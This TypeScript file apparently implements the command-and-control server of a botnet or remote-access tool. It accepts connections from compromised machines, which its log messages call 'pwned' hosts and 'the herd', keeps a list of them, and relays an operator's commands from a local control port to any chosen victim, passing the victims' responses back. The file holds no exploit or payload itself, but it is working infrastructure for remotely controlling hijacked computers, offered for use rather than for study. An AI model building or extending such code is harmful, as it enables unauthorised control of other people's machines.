import { Host, HostServer } from './hosts';
import { ControlServer, RemoteController } from './controllers';
import { PacketTypes } from '../../common/src/protocol';

interface CombinedServerOpts {
    [key: string]: string | number | undefined;
    host?: string;
    port?: number;
    controlHost?: string;
    controlPort?: number;
}

interface ResolvedCombinedServerOpts {
    [key: string]: string | number;
    readonly host: string;
    readonly port: number;
    readonly controlHost: string;
    readonly controlPort: number;
}

export class CombinedServer {
    hostList: Map<number, Host>;
    controllerList: Map<number, RemoteController>;
    nextHostID: number;
    nextControllerID: number;
    hostServer: HostServer | null;
    controlServer: ControlServer | null;
    opts: ResolvedCombinedServerOpts;

    constructor(public packetTypes: PacketTypes, opts: CombinedServerOpts) {
        const defaultOpts: ResolvedCombinedServerOpts = {
            host: '0.0.0.0',
            port: 6996,
            controlHost: '127.0.0.1',
            controlPort: 35768
        };
        
        for (let optName in defaultOpts) {
            if (!(optName in opts)) {
                opts[optName] = defaultOpts[optName];
            }
        }
        this.opts = opts as ResolvedCombinedServerOpts;

        this.hostList = new Map();
        this.controllerList = new Map();
        this.nextHostID = 0;
        this.nextControllerID = 0;
        this.hostServer = null;
        this.controlServer = null;
    }

    run() {
        this.hostServer = HostServer.createServer(this.opts.host, this.opts.port, () => {
            console.log(`Listening for incoming connections at ${this.opts.host}:${this.opts.port}`);
        }, this.packetTypes);
        this.hostServer.on('connection', this.handleHostConnection.bind(this));
        this.controlServer = ControlServer.createServer(this.opts.controlHost, this.opts.controlPort, () => {
            console.log(`[>] Connect to control server at ${this.opts.controlHost}:${this.opts.controlPort}`);
        }, this.packetTypes);
        this.controlServer.on('connection', this.handleControllerConnection.bind(this));
    }

    handleHostConnection(host: Host) {
        console.log(`[+] Pwned ${host.ip} ;)`);
        let hostID = this.nextHostID++;
        this.hostList.set(hostID, host);
        host.on('packet', (packet) => {
            let wrappedPkt = this.packetTypes.createPacket('control', 'response', 'hostresponse');
            wrappedPkt.id = hostID;
            wrappedPkt.data = packet;
            for (let c of this.controllerList.values()) {
                c.sendPacket(wrappedPkt);
            }
        });

        host.on('close', () => {
            console.log(`[-] Host ${host.ip} disconnected`);
            this.hostList.delete(hostID);
        });
        host.on('error', () => {
            console.log(`[!] Host ${host.ip} forcibly exited`);
        });

        let packet = this.packetTypes.createPacket('control', 'response', 'newpwn');
        packet.id = hostID;
        packet.ip = host.ip;
        for (let c of this.controllerList.values()) {
            c.sendPacket(packet);
        }
    }

    handleControllerConnection(controller: RemoteController) {
        console.log(`[+] Now controlling the herd from ${controller.ip}`);
        let controllerID = this.nextControllerID++;
        this.controllerList.set(controllerID, controller);
        for (let [id, host] of this.hostList) {
            let packet = this.packetTypes.createPacket('control', 'response', 'newpwn');
            packet.id = id;
            packet.ip = host.ip;
            controller.sendPacket(packet);
        }

        controller.on('hostcommand', (hostid, commandPacket) => {
            let hostOrUndefined = this.hostList.get(hostid);
            if (hostOrUndefined === undefined) {
                throw new Error('invalid host ID');
            }
            let host = hostOrUndefined;
            host.sendPacket(commandPacket);
        });

        controller.on('close', () => {
            console.log(`[-] Controller ${controller.ip} disconnected`);
            this.controllerList.delete(controllerID);
        });
        controller.on('error', () => {
            console.log(`[!] Controller ${controller.ip} forcibly exited`);
        });
    }
}
